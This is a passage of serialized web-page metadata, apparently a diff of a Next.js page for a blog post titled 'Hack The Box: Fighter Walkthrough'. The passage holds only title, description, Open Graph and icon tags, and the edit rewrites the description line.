Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"}]}]}30:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$32"}}]
 1a:[["$","meta","0",{"charSet":"utf-8"}],["$","meta","1",{"name":"viewport","content":"width=device-width, initial-scale=1"}],["$","meta","2",{"name":"theme-color","content":"#f2ede3"}],["$","meta","3",{"name":"color-scheme","content":"light"}]]
 33:I[6869,[],"IconMark"]
 17:null
-1c:[["$","title","0",{"children":"Hack The Box: Fighter Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An archived walkthrough of the retired Hack The Box Fighter machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: Fighter Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An archived walkthrough of the retired Hack The Box Fighter machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-fighter-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box Fighter machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T15:14:00.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: Fighter Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An archived walkthrough of the retired Hack The Box Fighter machine, preserved from Abdullah Kareem's OSWE Prep preparation notes."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-fighter-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L33","34",{}]]
+1c:[["$","title","0",{"children":"Hack The Box: Fighter Walkthrough | CyberKareem"}],["$","meta","1",{"name":"description","content":"An authorized-lab walkthrough of Hack The Box Fighter, covering the attack path, validation steps, and practical lessons."}],["$","meta","2",{"name":"application-name","content":"CyberKareem"}],["$","link","3",{"rel":"author","href":"https://cyberkareem.com"}],["$","meta","4",{"name":"author","content":"Abdullah Kareem"}],["$","link","5",{"rel":"manifest","href":"/site.webmanifest","crossOrigin":"$undefined"}],["$","meta","6",{"name":"keywords","content":"CyberKareem,Abdullah Kareem,security researcher,penetration tester,CVE researcher,offensive security,responsible disclosure,web application penetration testing,API security assessment,mobile application security,application security consulting"}],["$","meta","7",{"name":"referrer","content":"strict-origin-when-cross-origin"}],["$","meta","8",{"name":"creator","content":"Abdullah Kareem"}],["$","meta","9",{"name":"publisher","content":"CyberKareem"}],["$","meta","10",{"name":"robots","content":"noindex, follow"}],["$","link","11",{"rel":"canonical","href":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"}],["$","meta","12",{"property":"og:title","content":"Hack The Box: Fighter Walkthrough"}],["$","meta","13",{"property":"og:description","content":"An authorized-lab walkthrough of Hack The Box Fighter, covering the attack path, validation steps, and practical lessons."}],["$","meta","14",{"property":"og:url","content":"https://cyberkareem.com/writing/hackthebox-fighter-walkthrough/"}],["$","meta","15",{"property":"og:site_name","content":"CyberKareem"}],["$","meta","16",{"property":"og:locale","content":"en_US"}],["$","meta","17",{"property":"og:image","content":"https://cyberkareem.com/writing/covers/hackthebox-fighter-walkthrough.webp"}],["$","meta","18",{"property":"og:image:width","content":"300"}],["$","meta","19",{"property":"og:image:height","content":"300"}],["$","meta","20",{"property":"og:image:alt","content":"Hack The Box Fighter machine avatar"}],["$","meta","21",{"property":"og:type","content":"article"}],["$","meta","22",{"property":"article:published_time","content":"2026-06-11T15:14:00.000Z"}],["$","meta","23",{"property":"article:modified_time","content":"2026-07-12T00:00:00.000Z"}],["$","meta","24",{"property":"article:author","content":"https://cyberkareem.com"}],["$","meta","25",{"name":"twitter:card","content":"summary_large_image"}],["$","meta","26",{"name":"twitter:creator","content":"@CyberKareem"}],["$","meta","27",{"name":"twitter:title","content":"Hack The Box: Fighter Walkthrough"}],["$","meta","28",{"name":"twitter:description","content":"An authorized-lab walkthrough of Hack The Box Fighter, covering the attack path, validation steps, and practical lessons."}],["$","meta","29",{"name":"twitter:image","content":"https://cyberkareem.com/writing/covers/hackthebox-fighter-walkthrough.webp"}],["$","link","30",{"rel":"icon","href":"/icon.svg","type":"image/svg+xml"}],["$","link","31",{"rel":"icon","href":"/icon-192.png","type":"image/png","sizes":"192x192"}],["$","link","32",{"rel":"icon","href":"/icon-512.png","type":"image/png","sizes":"512x512"}],["$","link","33",{"rel":"apple-touch-icon","href":"/apple-touch-icon.png","sizes":"180x180"}],["$","$L33","34",{}]]
